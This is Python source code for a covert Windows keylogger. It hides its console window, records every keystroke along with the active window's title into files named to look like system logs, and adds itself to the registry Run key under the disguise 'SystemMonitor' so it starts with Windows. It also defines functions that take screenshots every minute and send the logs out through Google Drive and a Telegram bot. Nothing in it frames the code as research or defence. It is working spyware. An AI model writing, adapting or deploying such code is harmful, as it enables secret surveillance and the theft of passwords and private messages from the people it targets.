import os
import time
import csv
import logging
import winreg
import requests
import pyautogui
import pygetwindow as gw
from pynput import keyboard
from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
import win32console
import win32gui

# ---------------- Hide Console Window ----------------
win32console.FreeConsole()  # Hides the command prompt window
win32gui.ShowWindow(win32gui.GetForegroundWindow(), 0)  # Hides the script window

# ---------------- Global Variables ----------------
LOG_FILE = os.path.join(os.getenv("APPDATA"), "system_logs.txt")
CSV_FILE = os.path.join(os.getenv("APPDATA"), "system_logs.csv")
SCREENSHOT_FOLDER = os.path.join(os.getenv("APPDATA"), "screenshots")
if not os.path.exists(SCREENSHOT_FOLDER):
    os.makedirs(SCREENSHOT_FOLDER)

# Telegram Bot Credentials
BOT_TOKEN = "your_bot_token_here"
CHAT_ID = "your_chat_id_here"

# ---------------- Capture Active Window ----------------
def get_active_window():
    try:
        return gw.getActiveWindow().title
    except:
        return "Unknown Window"

# ---------------- Keylogger Functionality ----------------
log_data = []

def on_press(key):
    try:
        key = key.char
    except AttributeError:
        key = str(key)

    window = get_active_window()
    log_entry = f"[{window}] Key Pressed: {key}"
    log_data.append(log_entry)

    # Save logs to a text file
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

    # Save logs to a CSV file
    with open(CSV_FILE, "a", newline='') as file:
        writer = csv.writer(file)
        writer.writerow([window, key])

# ---------------- Take Screenshots Periodically ----------------
def take_screenshot():
    while True:
        screenshot_path = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{int(time.time())}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        time.sleep(60)  # Capture a screenshot every 60 seconds

# ---------------- Upload Logs to Google Drive ----------------
def upload_logs():
    gauth = GoogleAuth()
    gauth.LocalWebserverAuth()
    drive = GoogleDrive(gauth)

    file = drive.CreateFile({'title': 'keylog.txt'})
    file.SetContentFile(LOG_FILE)
    file.Upload()

# ---------------- Send Logs via Telegram ----------------
def send_telegram_log():
    message = "\n".join(log_data)
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                  data={"chat_id": CHAT_ID, "text": message})

# ---------------- Add to Windows Startup ----------------
def add_to_startup():
    file_path = os.path.abspath(__file__)
    key = winreg.HKEY_CURRENT_USER
    reg_key = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(reg_key, "SystemMonitor", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(reg_key)

# ---------------- Start Keylogger ----------------
add_to_startup()  # Run on system startup

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

